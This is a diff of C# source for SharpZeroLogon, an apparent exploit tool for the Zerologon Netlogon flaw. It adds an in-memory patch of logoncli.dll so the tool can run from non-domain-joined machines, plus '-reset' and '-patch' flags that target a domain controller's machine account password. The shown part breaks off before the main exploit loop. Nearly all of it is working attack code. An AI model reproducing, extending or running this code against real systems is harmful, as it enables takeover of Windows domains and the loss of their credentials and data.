@@ -1,95 +1,117 @@
 ﻿using System;
-using System.Runtime.InteropServices;
+using System.Diagnostics;
 using static SharpZeroLogon.Netapi32;
+using static SharpZeroLogon.Kernel32;
+using System.Runtime.InteropServices;
 
 namespace SharpZeroLogon
 {
-    class Netapi32
-    {
-        public enum NETLOGON_SECURE_CHANNEL_TYPE : int
-        {
-            NullSecureChannel = 0,
-            MsvApSecureChannel = 1,
-            WorkstationSecureChannel = 2,
-            TrustedDnsDomainSecureChannel = 3,
-            TrustedDomainSecureChannel = 4,
-            UasServerSecureChannel = 5,
-            ServerSecureChannel = 6
-        }
-
-        [StructLayout(LayoutKind.Explicit, Size = 516)]
-        public struct NL_TRUST_PASSWORD
-        {
-            [FieldOffset(0)]
-            public ushort Buffer;
-
-            [FieldOffset(512)]
-            public uint Length;
-        }
-
-        [StructLayout(LayoutKind.Explicit, Size = 12)]
-        public struct NETLOGON_AUTHENTICATOR
-        {
-            [FieldOffset(0)]
-            public NETLOGON_CREDENTIAL Credential;
-
-            [FieldOffset(8)]
-            public uint Timestamp;
-        }
-
-        [StructLayout(LayoutKind.Sequential)]
-        public struct NETLOGON_CREDENTIAL
-        {
-            public sbyte data;
-        }
-
-        [DllImport("netapi32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode)]
-        public static extern int I_NetServerReqChallenge(
-            string PrimaryName,
-            string ComputerName,
-            ref NETLOGON_CREDENTIAL ClientChallenge,
-            ref NETLOGON_CREDENTIAL ServerChallenge
-            );
-
-        [DllImport("netapi32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode)]
-        public static extern int I_NetServerAuthenticate2(
-            string PrimaryName,
-            string AccountName,
-            NETLOGON_SECURE_CHANNEL_TYPE AccountType,
-            string ComputerName,
-            ref NETLOGON_CREDENTIAL ClientCredential,
-            ref NETLOGON_CREDENTIAL ServerCredential,
-            ref ulong NegotiateFlags
-            );
-
-        [DllImport("netapi32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode)]
-        public static extern int I_NetServerPasswordSet2(
-            string PrimaryName,
-            string AccountName,
-            NETLOGON_SECURE_CHANNEL_TYPE AccountType,
-            string ComputerName,
-            ref NETLOGON_AUTHENTICATOR Authenticator,
-            out NETLOGON_AUTHENTICATOR ReturnAuthenticator,
-            ref NL_TRUST_PASSWORD ClearNewPassword
-            );
-    }
-
     class Program
     {
+        static int FindPattern(byte[] buf, byte[] pattern)
+        {
+            int start = 0;
+            int end = buf.Length - pattern.Length;
+            byte firstByte = pattern[0];
+
+            while (start <= end)
+            {
+                if (buf[start] == firstByte)
+                {
+                    for (int offset = 1; ; ++offset)
+                    {
+                        if (offset == pattern.Length)
+                        {
+                            return start;
+                        }
+                        else if (buf[start + offset] != pattern[offset])
+                        {
+                            break;
+                        }
+                    }
+                }
+                ++start;
+            }
+            return -1;
+        }
+
+        static bool PatchLogon()
+        {
+            // Patches logoncli.dll (x64) to use RPC over TCP/IP, making it work from non domain-joined
+            // Credit to Benjamin Delpy @gentilkiwi for the neat trick!
+            byte[] pattern = { 0xB8, 0x01, 0x00, 0x00, 0x00, 0x83, 0xF8, 0x01, 0x75, 0x3B };
+
+            IntPtr hProc = Process.GetCurrentProcess().Handle;
+            MODULEINFO modInfo = new MODULEINFO();
+            IntPtr hModule = LoadLibrary("logoncli.dll");
+
+            if (!GetModuleInformation(hProc, hModule, out modInfo, (uint)Marshal.SizeOf(modInfo)))
+                return false;
+
+            long addr = modInfo.lpBaseOfDll.ToInt64();
+            long maxSize = addr + modInfo.SizeOfImage;
+
+            while (addr < maxSize)
+            {
+                byte[] buf = new byte[1024];
+                int bytesRead = 0;
+                if (!ReadProcessMemory(hProc, addr, buf, 1024, ref bytesRead))
+                    return false;
+
+                int index = FindPattern(buf, pattern);
+                if (index > -1)
+                {
+                    long patchAddr = addr + index + 1;
+                    if (!VirtualProtect(new IntPtr(patchAddr), 1024, 0x04, out uint oldProtect))
+                        return false;
+
+                    // patch mov eax 1; => mov eax, 2;
+                    Marshal.WriteByte(new IntPtr(patchAddr), 0x02);
+
+                    if (!VirtualProtect(new IntPtr(patchAddr), 1024, oldProtect, out oldProtect))
+                        return false;
+                    return true;
+                }
+                addr += 1024;
+            }
+            return false;
+        }
+
         static void Main(string[] args)
         {
             if (args.Length < 1)
             {
-                Console.WriteLine(" Usage: SharpZeroLogon.exe <target dc fqdn> <reset: true/false>");
+                Console.WriteLine(" Usage: SharpZeroLogon.exe <target dc fqdn> <optional: -reset -patch>");
                 return;
             }
 
             bool reset = false;
+            bool patch = false;
             string fqdn = args[0];
             string hostname = fqdn.Split('.')[0];
 
-            if (args.Length == 2 && args[1] == "true")
-                reset = true;
+            foreach (string arg in args)
+            {
+                switch (arg)
+                {
+                    case "-reset":
+                        reset = true;
+                        break;
+                    case "-patch":
+                        patch = true;
+                        break;
+                }
+            }
+
+            if (patch)
+            {
+                if (!PatchLogon())
+                {
+                    Console.WriteLine("Patching failed :(");
+                    return;
+                }
+                Console.WriteLine("Patch successful. Will use ncacn_ip_tcp");
+            }
 
             NETLOGON_CREDENTIAL ClientChallenge = new NETLOGON_CREDENTIAL();
             NETLOGON_CREDENTIAL ServerChallenge = new NETLOGON_CREDENTIAL();
